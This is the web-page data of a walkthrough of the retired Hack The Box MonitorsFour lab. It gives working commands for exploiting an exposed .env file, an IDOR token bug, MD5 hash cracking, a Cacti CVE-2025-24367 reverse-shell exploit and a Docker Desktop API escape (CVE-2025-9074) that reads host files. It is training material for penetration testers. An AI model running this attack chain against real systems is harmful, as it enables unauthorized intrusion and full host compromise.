@@ -1,0 +1,309 @@
+1:"$Sreact.fragment"
+2:I[4236,[],""]
+3:I[170,[],""]
+5:I[6025,[],"OutletBoundary"]
+6:"$Sreact.suspense"
+9:I[6025,[],"ViewportBoundary"]
+b:I[6025,[],"MetadataBoundary"]
+d:I[4168,[],"default",1]
+:HL["/_next/static/css/d6e294cd2610ae11.css","style"]
+0:{"P":null,"c":["","writing","hackthebox-monitorsfour-walkthrough",""],"q":"","i":false,"f":[[["",{"children":["writing",{"children":[["slug","hackthebox-monitorsfour-walkthrough","d",null],{"children":["__PAGE__",{}]}]}]},"$undefined","$undefined",16],[["$","$1","c",{"children":[[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/d6e294cd2610ae11.css","precedence":"next","crossOrigin":"$undefined","nonce":"$undefined"}]],["$","html",null,{"lang":"en","children":["$","body",null,{"children":[["$","$L2",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L3",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":[[["$","title",null,{"children":"404: This page could not be found."}],["$","div",null,{"style":{"fontFamily":"system-ui,\"Segoe UI\",Roboto,Helvetica,Arial,sans-serif,\"Apple Color Emoji\",\"Segoe UI Emoji\"","height":"100vh","textAlign":"center","display":"flex","flexDirection":"column","alignItems":"center","justifyContent":"center"},"children":["$","div",null,{"children":[["$","style",null,{"dangerouslySetInnerHTML":{"__html":"body{color:#000;background:#fff;margin:0}.next-error-h1{border-right:1px solid rgba(0,0,0,.3)}@media (prefers-color-scheme:dark){body{color:#fff;background:#000}.next-error-h1{border-right:1px solid rgba(255,255,255,.3)}}"}}],["$","h1",null,{"className":"next-error-h1","style":{"display":"inline-block","margin":"0 20px 0 0","padding":"0 23px 0 0","fontSize":24,"fontWeight":500,"verticalAlign":"top","lineHeight":"49px"},"children":404}],["$","div",null,{"style":{"display":"inline-block"},"children":["$","h2",null,{"style":{"fontSize":14,"fontWeight":400,"lineHeight":"49px","margin":0},"children":"This page could not be found."}]}]]}]}]],[]],"forbidden":"$undefined","unauthorized":"$undefined"}],["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"{\"@context\":\"https://schema.org\",\"@graph\":[{\"@type\":\"Person\",\"@id\":\"https://cyberkareem.com/#person\",\"name\":\"Abdullah Kareem\",\"alternateName\":\"CyberKareem\",\"url\":\"https://cyberkareem.com\",\"jobTitle\":\"Security Researcher and Penetration Tester\",\"knowsAbout\":[\"Vulnerability research\",\"Penetration testing\",\"Responsible disclosure\",\"Web application security\",\"API security\",\"Mobile application security\",\"Infrastructure security\",\"Active Directory security\",\"Wireless security\",\"Application security consulting\"],\"sameAs\":[\"https://www.linkedin.com/in/cyberkareem/\",\"https://github.com/CyberKareem\",\"https://x.com/cyberkareem\",\"https://linktr.ee/cyberkareem\",\"https://app.hackthebox.com/public/users/349278\",\"https://www.credential.net/profile/cyberkareem/wallet\",\"https://www.credly.com/users/cyberkareem/badges\"]},{\"@type\":\"WebSite\",\"@id\":\"https://cyberkareem.com/#website\",\"url\":\"https://cyberkareem.com\",\"name\":\"CyberKareem — Abdullah Kareem\",\"publisher\":{\"@id\":\"https://cyberkareem.com/#person\"}}]}"}}]]}]}]]}],{"children":[["$","$1","c",{"children":[null,["$","$L2",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L3",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":"$undefined","forbidden":"$undefined","unauthorized":"$undefined"}]]}],{"children":[["$","$1","c",{"children":[null,["$","$L2",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L3",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":"$undefined","forbidden":"$undefined","unauthorized":"$undefined"}]]}],{"children":[["$","$1","c",{"children":["$L4",null,["$","$L5",null,{"children":["$","$6",null,{"name":"Next.MetadataOutlet","children":"$@7"}]}]]}],{},null,false,null]},null,false,"$@8"]},null,false,"$@8"]},null,false,null],["$","$1","h",{"children":[null,["$","$L9",null,{"children":"$La"}],["$","div",null,{"hidden":true,"children":["$","$Lb",null,{"children":["$","$6",null,{"name":"Next.Metadata","children":"$Lc"}]}]}],null]}],false]],"m":"$undefined","G":["$d",[]],"S":true,"h":null,"s":"$undefined","l":"$undefined","p":"$undefined","d":"$undefined","b":"65jXSdzueZKnFbMeYrtpi"}
+e:[]
+8:"$We"
+f:I[2509,["509","static/chunks/509-dbc1ccf593ce6127.js","851","static/chunks/app/writing/%5Bslug%5D/page-bea6638222930ed2.js"],""]
+10:I[6621,["509","static/chunks/509-dbc1ccf593ce6127.js","851","static/chunks/app/writing/%5Bslug%5D/page-bea6638222930ed2.js"],"MobileNavigation"]
+:HL["/writing/covers/hackthebox-monitorsfour-walkthrough.webp","image"]
+4:[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$Lf",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","a","/research",{"href":"/research","aria-current":"$undefined","children":"Research"}],["$","a","/services",{"href":"/services","aria-current":"$undefined","children":"Services"}],["$","a","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","a","/projects",{"href":"/projects","aria-current":"$undefined","children":"Projects"}],["$","a","/about",{"href":"/about","aria-current":"$undefined","children":"About"}]]}],["$","$Lf",null,{"className":"utility-link","href":"/contact#assessment-enquiries","aria-current":"$undefined","children":["Start an enquiry ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L10",null,{"items":[{"label":"Research","href":"/research"},{"label":"Services","href":"/services"},{"label":"Writing","href":"/writing"},{"label":"Projects","href":"/projects"},{"label":"About","href":"/about"},{"label":"Contact","href":"/contact"}],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$Lf",null,{"href":"/writing","children":"Writing archive"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: MonitorsFour Walkthrough"}],["$","p",null,{"className":"article-dek","children":"An archived walkthrough of the retired Hack The Box MonitorsFour machine, preserved from Abdullah Kareem's OSWE Prep preparation notes."}],["$","dl",null,{"className":"article-meta","children":[["$","div",null,{"children":[["$","dt",null,{"children":"Published"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-06-11T12:37:17.000Z","children":"11 Jun 2026"}]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Reading time"}],["$","dd",null,{"children":[7," minutes"]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Author"}],["$","dd",null,{"children":"Abdullah Kareem"}]]}]]}],["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-monitorsfour-walkthrough.webp","width":300,"height":300,"alt":"Hack The Box MonitorsFour machine avatar","decoding":"async"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official MonitorsFour machine artwork, used for identification. Hack The Box is not affiliated with this archive."}],["$","a",null,{"href":"https://www.hackthebox.com/machines/monitorsfour","target":"_blank","rel":"nofollow noopener noreferrer","children":["Hack The Box machine artwork"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}]]}]]}]]}],["$","div",null,{"className":"article-rule"}],["$","div",null,{"className":"article-layout shell","children":[["$","aside",null,{"className":"article-context","aria-label":"Article provenance and review context","children":[["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Archive provenance"}],[["$","p",null,{"children":["Archived from public GitHub preparation notes"," on ","11 Jun 2026",". Added to CyberKareem on ","12 Jul 2026","."]}],["$","a",null,{"href":"https://github.com/CyberKareem/OSWE-Prep/blob/4914829c7a83a28a4a672114c1f5c4a17a040311/HTB-MonitorsFour.md","target":"_blank","rel":"nofollow noopener noreferrer","children":["Immutable source revision ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}],["$","small",null,{"children":["CyberKareem/OSWE-Prep"," · 4914829c7a83",""]}]]]}],["$","div",null,{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["MonitorsFour"," · Windows"," · Medium"," · Retired status verified 12 Jul 2026","."]}],"$L11"]}],["$L12","$L13","$L14"]]}],"$L15"]}]]}],"$L16"]}],"$L17","$L18"]
+11:["$","a",null,{"href":"https://www.hackthebox.com/machines/monitorsfour","target":"_blank","rel":"nofollow noopener noreferrer","children":["Open Hack The Box profile ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}]
+12:["$","div","lab-archive-0",{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Archived, authorized retired-lab walkthrough"}],["$","p",null,{"children":"This personal lab note documents the officially retired Hack The Box MonitorsFour machine. Retired status was verified on 12 July 2026. Use the techniques only on systems you own or have explicit permission to test."}],null]}]
+13:["$","div","source-context-1",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"GitHub archive context"}],["$","p",null,{"children":"Imported mechanically from Abdullah Kareem's public preparation notes. Commands and claims reflect the archived lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}]
+14:["$","div","editorial-correction-2",{"className":"article-review-note article-review-editorial-correction","children":[["$","span",null,{"children":"Reusable artifacts removed"}],["$","p",null,{"children":"11 redacted retired-lab artifact occurrences were replaced with descriptive placeholders while preserving the attack method, including credentials, keys, tickets, hashes, flags, private links, or encoded material."}],null]}]
+19:T3452,
+<p><strong>Difficulty:</strong> Medium<br /><strong>OS:</strong> Windows (Docker Desktop + WSL2)<br /><strong>Tags:</strong> <code>IDOR</code> <code>Hash Cracking</code> <code>Credential Reuse</code> <code>CVE-2025-24367</code> <code>Docker Escape</code> <code>CVE-2025-9074</code><br /><strong>User Flag:</strong> <code>8775782[redacted]c7c087081a</code><br /><strong>Root Flag:</strong> <code>f77a0c[redacted]4e435c226</code></p>
+<hr />
+<h2 id="attack-chain-overview">Attack Chain Overview</h2>
+<pre><code>.env exposure → IDOR (token=REDACTED → Hash crack → Cacti RCE (CVE-2025-24367) → Docker API escape (CVE-2025-9074) → Root
+</code></pre>
+<hr />
+<h2 id="step-1-setup-add-hosts">Step 1 — Setup: Add Hosts</h2>
+<pre><code class="language-bash" data-language="bash">echo "10.10.11.98 monitorsfour.htb cacti.monitorsfour.htb" | sudo tee -a /etc/hosts
+</code></pre>
+<p><strong>Why:</strong> The web server uses virtual hosting (name-based routing). Without this entry, your browser/tools can't resolve the hostname and will get no response or the wrong page.</p>
+<hr />
+<h2 id="step-2-port-scan">Step 2 — Port Scan</h2>
+<pre><code class="language-bash" data-language="bash">nmap -sC -sV -p- 10.10.11.98 -oN nmap_full.txt
+</code></pre>
+<p><strong>Results:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Port</th>
+<th>Service</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>80</td>
+<td>nginx (PHP)</td>
+<td>Main web app</td>
+</tr>
+<tr>
+<td>5985</td>
+<td>WinRM</td>
+<td>Windows Remote Management</td>
+</tr>
+</tbody></table>
+<p><strong>Why:</strong> Always scan all ports (<code>-p-</code>). Port 5985 tells us the host OS is Windows even though we'll land in a Linux container — important context for privilege escalation later.</p>
+<hr />
+<h2 id="step-3-find-the-env-file">Step 3 — Find the .env File</h2>
+<pre><code class="language-bash" data-language="bash">curl http://monitorsfour.htb/.env
+</code></pre>
+<p><strong>Result:</strong></p>
+<pre><code>DB_HOST=mariadb
+DB_PORT=3306
+DB_NAME=monitorsfour_db
+DB_USER=monitorsdbuser
+DB_PASS=f37p2j8f4t0r
+</code></pre>
+<p><strong>Why:</strong> <code>.env</code> files store app configuration and secrets. Developers often forget to block public access to them. Always check for <code>.env</code>, <code>.git</code>, <code>config.php</code>, <code>backup.sql</code> etc. during recon.</p>
+<hr />
+<h2 id="step-4-subdomain-discovery">Step 4 — Subdomain Discovery</h2>
+<pre><code class="language-bash" data-language="bash">ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
+     -u http://monitorsfour.htb \
+     -H "Host: FUZZ.monitorsfour.htb" -ac
+</code></pre>
+<p><strong>Result:</strong> <code>cacti.monitorsfour.htb</code></p>
+<p><strong>Why:</strong> The main site may be locked down but subdomains often host internal tools (admin panels, monitoring systems) with weaker security. Always enumerate subdomains.</p>
+<hr />
+<h2 id="step-5-idor-via-token-redacted-user-dump">Step 5 — IDOR via token=REDACTED (User Dump)</h2>
+<pre><code class="language-bash" data-language="bash"># First, find the token parameter
+ffuf -u "http://monitorsfour.htb/user?FUZZ=test123" \
+  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
+  -t 30 -fr "Missing token parameter" -fs 0
+
+# Then dump all users
+curl -s "http://monitorsfour.htb/user?token=REDACTED
+</code></pre>
+<p><strong>Why this works:</strong> The backend code checks <code>if token:REDACTEDif token is REDACTED None:</code>. In many languages <code>0</code> is "falsy", so the token validation is skipped entirely and all user records are returned. This is a classic <strong>IDOR</strong> (Insecure Direct Object Reference) combined with a type juggling bug.</p>
+<p><strong>Result:</strong> Full JSON dump including MD5 password hashes:</p>
+<pre><code class="language-json" data-language="json">{"username":"admin","password":null,"name":"Marcus Higgins"}
+</code></pre>
+<hr />
+<h2 id="step-6-crack-the-hash">Step 6 — Crack the Hash</h2>
+<pre><code class="language-bash" data-language="bash">echo "admin:[redacted retired-lab hash or flag]" &gt; hashes.txt
+john --format=raw-md5 hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
+</code></pre>
+<p><strong>Result:</strong> <code>wonderful1</code></p>
+<p><strong>Why:</strong> MD5 is a broken hashing algorithm — it's fast to compute and has no salt here, making it trivially crackable with a dictionary attack. Always try john/hashcat against leaked hashes.</p>
+<blockquote>
+<p><strong>Note:</strong> The hash belongs to <code>admin</code> but the Cacti username is <code>marcus</code> (from the name field "Marcus Higgins"). Always try variant usernames when credential reuse is suspected.</p>
+</blockquote>
+<hr />
+<h2 id="step-7-login-to-cacti">Step 7 — Login to Cacti</h2>
+<ul>
+<li>URL: <code>http://cacti.monitorsfour.htb/cacti/</code></li>
+<li>Username: <code>marcus</code></li>
+<li>Password: null</li>
+<li>Version confirmed: <strong>Cacti 1.2.28</strong></li>
+</ul>
+<p><strong>Why this works:</strong> Credential reuse — the same password was set on both the main app and Cacti. Always try discovered credentials on every login form you find.</p>
+<hr />
+<h2 id="step-8-exploit-cve-2025-24367-cacti-rce">Step 8 — Exploit CVE-2025-24367 (Cacti RCE)</h2>
+<p><strong>Vulnerability:</strong> Cacti ≤ 1.2.28 allows command injection in the Graph Template <code>right_axis_label</code> field. The value is passed unsanitized to <code>rrdtool</code>, which interprets newlines as separate commands.</p>
+<p><strong>How it works:</strong></p>
+<ol>
+<li>Attacker injects newlines into <code>right_axis_label</code></li>
+<li>Cacti passes this to rrdtool as part of a graph rendering command</li>
+<li>rrdtool interprets each line as a separate command</li>
+<li>One command creates an RRD file, another writes a PHP webshell</li>
+<li>The PHP file ends up in the Cacti web root</li>
+<li>Visiting the PHP file executes the reverse shell</li>
+</ol>
+<pre><code class="language-bash" data-language="bash"># Setup
+git clone https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC.git
+cd CVE-2025-24367-Cacti-PoC
+python3 -m venv venv &amp;&amp; source venv/bin/activate
+pip install requests beautifulsoup4
+
+# Terminal 1 — listener
+nc -lvnp 1337
+
+# Terminal 2 — exploit (sudo needed: script binds port 80 to serve payload)
+sudo venv/bin/python3 exploit.py \
+  -url http://cacti.monitorsfour.htb \
+  -u marcus -p wonderful1 \
+  -i &lt;YOUR_TUN0_IP&gt; -l 1337
+</code></pre>
+<p><strong>Why sudo:</strong> The exploit spins up a temporary HTTP server on port 80 to deliver a bash reverse shell script to the target. Port 80 requires root privileges to bind.</p>
+<p><strong>Expected output:</strong></p>
+<pre><code>[+] Cacti Instance Found!
+[+] Serving HTTP on port 80
+[+] Login Successful!
+[+] Got graph ID: 226
+[i] Created PHP filename: xxxxx.php
+[+] Got payload: /bash
+[i] Created PHP filename: xxxxx.php
+[+] Hit timeout, looks good for shell, check your listener!
+</code></pre>
+<p><strong>Shell lands as:</strong> <code>www-data</code> inside a Docker container</p>
+<hr />
+<h2 id="step-9-user-flag">Step 9 — User Flag</h2>
+<pre><code class="language-bash" data-language="bash">cat /home/marcus/user.txt
+</code></pre>
+<p>The file is world-readable (mode 644) so <code>www-data</code> can read it even without being the owner.</p>
+<hr />
+<h2 id="step-10-container-enumeration">Step 10 — Container Enumeration</h2>
+<pre><code class="language-bash" data-language="bash">hostname        # short container ID e.g. 821fbd6a43fa — confirms we're in Docker
+ip addr         # container IP: 172.18.0.x
+ip route        # gateway: 172.18.0.1
+uname -a        # kernel shows: microsoft-standard-WSL2
+</code></pre>
+<p><strong>Why:</strong> Always understand where you landed. The WSL2 kernel confirms we're inside Docker Desktop on Windows — this changes the escape strategy.</p>
+<hr />
+<h2 id="step-11-find-the-docker-api-cve-2025-9074">Step 11 — Find the Docker API (CVE-2025-9074)</h2>
+<p><strong>Vulnerability:</strong> Docker Desktop exposes its Engine API on <code>192.168.65.7:2375</code> to internal containers without authentication. This is by design in Docker Desktop's internal networking model but is exploitable.</p>
+<pre><code class="language-bash" data-language="bash"># Scan the Docker Desktop internal subnet for the API
+for i in $(seq 1 254); do
+  (curl -s --connect-timeout 1 http://192.168.65.$i:2375/version 2&gt;/dev/null \
+  | grep -q "ApiVersion" &amp;&amp; echo "192.168.65.$i OPEN") &amp;
+done; wait
+</code></pre>
+<p><strong>Result:</strong> <code>192.168.65.7 OPEN</code></p>
+<p><strong>Why 192.168.65.0/24:</strong> Docker Desktop on Windows uses this subnet for its internal WSL2 networking. <code>host.docker.internal</code> resolves to <code>.254</code> but the API is on <code>.7</code>.</p>
+<pre><code class="language-bash" data-language="bash"># Confirm API access
+curl http://192.168.65.7:2375/version
+
+# List available images
+curl -s http://192.168.65.7:2375/images/json | grep -o '"RepoTags":\[[^]]*\]'
+</code></pre>
+<p><strong>Available images:</strong></p>
+<ul>
+<li><code>docker_setup-nginx-php:latest</code></li>
+<li><code>docker_setup-mariadb:latest</code></li>
+<li><code>alpine:latest</code>  ← use this</li>
+</ul>
+<hr />
+<h2 id="step-12-docker-escape-root-flag">Step 12 — Docker Escape → Root Flag</h2>
+<p><strong>Why this works:</strong> The Docker API has no authentication. We can create a new privileged container that mounts the Windows host filesystem (<code>C:\</code> drive) at <code>/mnt/host_root</code>. From inside that container we can read any file on the host — including <code>root.txt</code> on the Administrator's Desktop.</p>
+<p>The path <code>/mnt/host/c</code> is how Docker Desktop on Windows exposes the host <code>C:\</code> drive to containers via WSL2.</p>
+<pre><code class="language-bash" data-language="bash"># Create container with host C:\ mounted
+curl -X POST http://192.168.65.7:2375/containers/create \
+  -H "Content-Type: application/json" \
+  -d '{
+    "Image": "alpine:latest",
+    "Cmd": ["/bin/sh", "-c", "cat /mnt/host_root/Users/Administrator/Desktop/root.txt"],
+    "HostConfig": {"Binds": ["/mnt/host/c:/mnt/host_root"]},
+    "Tty": true
+  }' \
+  -o /tmp/c.json
+
+# Extract container ID and start it
+cid=$(grep -o '"Id":"[^"]*"' /tmp/c.json | cut -d'"' -f4 | cut -c1-12)
+curl -X POST http://192.168.65.7:2375/containers/$cid/start
+
+# Read root flag from container logs
+sleep 2
+curl "http://192.168.65.7:2375/containers/$cid/logs?stdout=true"
+</code></pre>
+<p><strong>Root flag returned directly in the curl response — no reverse shell needed.</strong></p>
+<hr />
+<h2 id="key-vulnerabilities-summary">Key Vulnerabilities Summary</h2>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Vulnerability</th>
+<th>Impact</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>Exposed <code>.env</code> file</td>
+<td>DB credentials leaked</td>
+</tr>
+<tr>
+<td>2</td>
+<td>IDOR + falsy token=REDACTED</td>
+<td>Full user database dump</td>
+</tr>
+<tr>
+<td>3</td>
+<td>MD5 without salt</td>
+<td>Password cracked instantly</td>
+</tr>
+<tr>
+<td>4</td>
+<td>Credential reuse</td>
+<td>Cacti admin access</td>
+</tr>
+<tr>
+<td>5</td>
+<td>CVE-2025-24367 (Cacti ≤ 1.2.28)</td>
+<td>RCE via rrdtool injection</td>
+</tr>
+<tr>
+<td>6</td>
+<td>CVE-2025-9074 (Docker Desktop)</td>
+<td>Unauthenticated Docker API → host filesystem access</td>
+</tr>
+</tbody></table>
+<hr />
+<h2 id="lessons-learned">Lessons Learned</h2>
+<ul>
+<li><strong>Always check <code>.env</code>, <code>.git</code>, <code>backup</code> files</strong> — developers forget to block them</li>
+<li><strong>Test falsy values</strong> (<code>0</code>, <code>-1</code>, <code>null</code>, <code>""</code>) on every token/ID parameter</li>
+<li><strong>Credential reuse is extremely common</strong> — try every set of creds on every login form</li>
+<li><strong>Understand your execution context</strong> — container vs host changes everything</li>
+<li><strong>Docker Desktop has a unique network model</strong> — <code>192.168.65.0/24</code> is the internal subnet</li>
+<li><strong>Unauthenticated Docker API = full host compromise</strong> — always scan internal subnets from inside containers</li>
+<li><strong>Machine state matters for exploits</strong> — stale RRD files from failed attempts can block re-exploitation; reset the machine for a clean run</li>
+</ul>
+<hr />
+<h2 id="tools-used">Tools Used</h2>
+<table>
+<thead>
+<tr>
+<th>Tool</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>nmap</code></td>
+<td>Port scanning</td>
+</tr>
+<tr>
+<td><code>ffuf</code></td>
+<td>Subdomain + parameter fuzzing</td>
+</tr>
+<tr>
+<td><code>curl</code></td>
+<td>API interaction</td>
+</tr>
+<tr>
+<td><code>john</code></td>
+<td>Hash cracking</td>
+</tr>
+<tr>
+<td><code>nc</code></td>
+<td>Reverse shell listener</td>
+</tr>
+<tr>
+<td>Python PoC</td>
+<td>CVE-2025-24367 exploit</td>
+</tr>
+</tbody></table>
+<hr />
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC" target="_blank" rel="nofollow noopener noreferrer">CVE-2025-24367 PoC</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-9074" target="_blank" rel="nofollow noopener noreferrer">CVE-2025-9074 — Docker Desktop API exposure</a></li>
+<li><a href="https://www.cacti.net/" target="_blank" rel="nofollow noopener noreferrer">Cacti Official Site</a></li>
+</ul>
+15:["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$19"}}]
+16:["$","nav",null,{"className":"article-pagination shell","aria-label":"Writing archive navigation","children":[["$","div",null,{"children":["$","$Lf",null,{"href":"/writing/hackthebox-mirage-walkthrough","children":[["$","span",null,{"children":"Newer article"}],["$","strong",null,{"children":"Hack The Box: Mirage Walkthrough"}]]}]}],["$","$Lf",null,{"className":"article-pagination-index","href":"/writing","children":["All ",114," articles"]}],["$","div",null,{"children":["$","$Lf",null,{"href":"/writing/hackthebox-nodeblog-walkthrough","children":[["$","span",null,{"children":"Older article"}],["$","strong",null,{"children":"Hack The Box: NodeBlog Walkthrough"}]]}]}]]}]
+17:["$","footer",null,{"className":"site-footer","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$Lf",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Security Researcher and Penetration Tester"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$Lf","Research",{"href":"/research","children":"Research"}],["$","$Lf","Services",{"href":"/services","children":"Services"}],["$","$Lf","Writing",{"href":"/writing","children":"Writing"}],["$","$Lf","Projects",{"href":"/projects","children":"Projects"}],["$","$Lf","About",{"href":"/about","children":"About"}],["$","$Lf","Contact",{"href":"/contact","children":"Contact"}],["$","$Lf","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Public profiles","children":[["$","a","LinkedIn",{"href":"https://www.linkedin.com/in/cyberkareem/","target":"_blank","rel":"noreferrer","children":["LinkedIn"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","GitHub",{"href":"https://github.com/CyberKareem","target":"_blank","rel":"noreferrer","children":["GitHub"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","X",{"href":"https://x.com/cyberkareem","target":"_blank","rel":"noreferrer","children":["X"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Hack The Box",{"href":"https://app.hackthebox.com/public/users/349278","target":"_blank","rel":"noreferrer","children":["Hack The Box"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Credential wallet",{"href":"https://www.credential.net/profile/cyberkareem/wallet","target":"_blank","rel":"noreferrer","children":["Credential wallet"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Credly",{"href":"https://www.credly.com/users/cyberkareem/badges","target":"_blank","rel":"noreferrer","children":["Credly"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]]}]]}],["$","div",null,{"className":"shell footer-bottom","children":[["$","span",null,{"children":"© 2026 Abdullah Kareem"}],["$","span",null,{"children":"Evidence-led research · authorized assessment"}],["$","$Lf",null,{"href":"/services","children":"Explore security services →"}]]}]]}]
+1a:T54c,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-monitorsfour-walkthrough/#article","headline":"Hack The Box: MonitorsFour Walkthrough","description":"An archived walkthrough of the retired Hack The Box MonitorsFour machine, preserved from Abdullah Kareem's OSWE Prep preparation notes.","url":"https://cyberkareem.com/writing/hackthebox-monitorsfour-walkthrough/","datePublished":"2026-06-11T12:37:17.000Z","dateModified":"2026-07-12T00:00:00.000Z","wordCount":1214,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSWE-Prep/blob/4914829c7a83a28a4a672114c1f5c4a17a040311/HTB-MonitorsFour.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/writing/covers/hackthebox-monitorsfour-walkthrough.webp","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-monitorsfour-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: MonitorsFour Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-monitorsfour-walkthrough/"}]}]}18:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$1a"}}]
+a:[["$","meta","0",{"charSet":"utf-8"}],["$","meta","1",{"name":"viewport","content":"width=device-width, initial-scale=1"}],["$","meta","2",{"name":"theme-color","content":"#f2ede3"}],["$","meta","3",{"name":"color-scheme","content":"light"}]]
+1b:I[1884,[],"IconMark"]
+7:null
+c:[["$","title","0",{"children":"Hack The Box: MonitorsFour Walkthrough — CyberKareem"}],["$","meta","1",{"name":"description","content":"An archived walkthrough of the retired Hack The Box MonitorsFour machine, preserved from Abdullah Kareem's OSWE Prep preparation notes."}],["$","meta","2",{"name":"application-name","content":"CyberKareem"}],["$","link","3",{"rel":"author","href":"https://cyberkareem.com"}],["$","meta","4",{"name":"author","content":"Abdullah Kareem"}],["$","link","5",{"rel":"manifest","href":"/site.webmanifest","crossOrigin":"$undefined"}],["$","meta","6",{"name":"keywords","content":"CyberKareem,Abdullah Kareem,security researcher,penetration tester,CVE researcher,offensive security,responsible disclosure,web application penetration testing,API security assessment,mobile application security,application security consulting"}],["$","meta","7",{"name":"creator","content":"Abdullah Kareem"}],["$","meta","8",{"name":"publisher","content":"CyberKareem"}],["$","meta","9",{"name":"robots","content":"index, follow"}],["$","link","10",{"rel":"canonical","href":"https://cyberkareem.com/writing/hackthebox-monitorsfour-walkthrough/"}],["$","meta","11",{"property":"og:title","content":"Hack The Box: MonitorsFour Walkthrough"}],["$","meta","12",{"property":"og:description","content":"An archived walkthrough of the retired Hack The Box MonitorsFour machine, preserved from Abdullah Kareem's OSWE Prep preparation 